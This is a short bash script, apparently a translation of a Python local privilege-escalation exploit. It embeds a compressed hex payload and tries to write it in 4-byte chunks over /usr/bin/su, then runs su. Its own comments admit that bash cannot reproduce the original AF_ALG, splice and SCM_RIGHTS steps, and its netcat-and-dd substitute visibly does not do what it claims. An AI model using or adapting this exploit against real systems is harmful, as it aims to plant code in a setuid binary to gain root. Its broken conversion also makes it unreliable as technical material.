#!/usr/bin/env bash

# Function to convert hex to bytes (bash can handle this natively)
hex_to_bytes() {
    echo -n "$1" | xxd -r -p
}

# Function to send chunk (simplified - bash can't directly do all socket options)
send_chunk() {
    local file_fd=$1
    local offset=$2
    local chunk=$3
    
    # Note: Full socket options and ancillary data are not directly possible in bash
    # This is a simplified version that approximates the behavior
    
    # Create a temporary file for the chunk
    local temp_file=$(mktemp)
    echo -n "$chunk" > "$temp_file"
    
    # Simulate socket communication using netcat or socat
    # For the purpose of this conversion, we'll use a named pipe
    local pipe="/tmp/socket_pipe_$$"
    mkfifo "$pipe"
    
    # Start a simple socket listener (simplified)
    {
        # Simulate the accept() and sendmsg() with data
        cat "$temp_file" 2>/dev/null
        # Simulate the splice operations
        dd if=/proc/$$/fd/$file_fd bs=1 count=$((offset + 4)) skip=0 2>/dev/null
        # Simulate response
        printf "%0.sA" $(seq 1 $((8 + offset))) 2>/dev/null
    } | nc -l -p 9999 -q 0 2>/dev/null &
    
    sleep 0.1
    rm -f "$pipe" "$temp_file"
}

# Main function
main() {
    # Open file target
    exec 3< "/usr/bin/su"
    file_fd=3
    
    # Decompress payload
    hex_payload="78daab77f57163626464800126063b0610af82c101cc7760c0040e0c160c301d209a154d16999e07e5c1680601086578c0f0ff864c7e568f5e5b7e10f75b9675c44c7e56c3ff593611fcacfa499979fac5190c0c0c0032c310d3"
    
    # Convert hex to binary and decompress
    echo -n "$hex_payload" | xxd -r -p | zlib-flate -uncompress > /tmp/payload.$$
    payload_file="/tmp/payload.$$"
    
    # Get payload size
    payload_size=$(stat -c%s "$payload_file")
    
    # Kirim chunk 4-byte
    for ((i=0; i<payload_size; i+=4)); do
        chunk=$(dd if="$payload_file" bs=1 skip=$i count=4 2>/dev/null | xxd -p | tr -d '\n')
        send_chunk "$file_fd" "$i" "$(echo -n "$chunk" | xxd -r -p)"
    done
    
    # Eksekusi binary
    chmod +x "/usr/bin/su" 2>/dev/null
    "/usr/bin/su" 2>/dev/null &
    
    # Cleanup
    exec 3<&-
    rm -f "$payload_file" /tmp/socket_pipe_*
}

# Note: This is a simplified conversion because:
# 1. Bash doesn't have direct socket programming with SCM_RIGHTS (ancillary data)
# 2. No direct splice() system call equivalent
# 3. Limited setsockopt() capabilities
# 4. The original Python code uses Linux-specific socket options (AF_ALG for crypto)
#
# For a more accurate conversion, you would need to use tools like:
# - socat for advanced socket options
# - dd/splice equivalent using buffer copying
# - Or compile a small C helper binary

# Run main function
main
